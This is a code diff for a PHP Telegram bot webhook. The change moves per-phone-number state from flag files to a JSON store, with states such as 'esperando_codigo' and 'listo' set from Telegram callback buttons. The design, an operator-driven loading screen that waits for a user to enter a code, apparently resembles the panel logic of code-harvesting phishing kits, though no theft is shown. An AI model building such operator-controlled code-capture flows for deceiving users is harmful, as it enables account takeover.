@@ -43,15 +43,24 @@ function marcarListo($telefono)
     file_put_contents(flagPath($telefono), '1');
 }
 
-function finalFlagPath($telefono)
+function setEstado($telefono, $estado)
 {
-    $safe = preg_replace('/[^0-9]+/', '_', $telefono);
-    return __DIR__ . '/done_' . $safe . '.flag';
-}
-
-function marcarFinal($telefono)
-{
-    file_put_contents(finalFlagPath($telefono), '1');
+    $archivo = rutaCodigos();
+    $datos = [];
+    if (is_file($archivo)) {
+        $json = file_get_contents($archivo);
+        $tmp  = json_decode($json, true);
+        if (is_array($tmp)) {
+            $datos = $tmp;
+        }
+    }
+    $existente = $datos[$telefono] ?? [];
+    if (!is_array($existente)) {
+        $existente = ['codigo' => $existente];
+    }
+    $existente['estado'] = $estado;
+    $datos[$telefono] = $existente;
+    file_put_contents($archivo, json_encode($datos));
 }
 
 function enviarATelegram($botToken, $chatId, $texto, $replyMarkup = null)
@@ -105,8 +114,8 @@ if (isset($update['callback_query'])) {
             $nuevoCodigo = random_int(100000, 999999);
             guardarCodigo($telefono, $nuevoCodigo);
 
-            // Marcar como listo para que la pantalla de carga pueda continuar
-            marcarListo($telefono);
+            // Marcar estado para indicar que estamos esperando que el usuario escriba el código
+            setEstado($telefono, 'esperando_codigo');
 
             // Obtener nombre almacenado para ese teléfono (si existe)
             $archivo = rutaCodigos();
@@ -146,7 +155,7 @@ if (isset($update['callback_query'])) {
         $telefono = substr($data, strlen('LISTO|'));
         $telefono = trim($telefono);
         if ($telefono !== '') {
-            marcarFinal($telefono);
+            setEstado($telefono, 'listo');
             enviarATelegram($BOT_TOKEN, $chatId, 'Marcado como listo ✅');
         }
     }
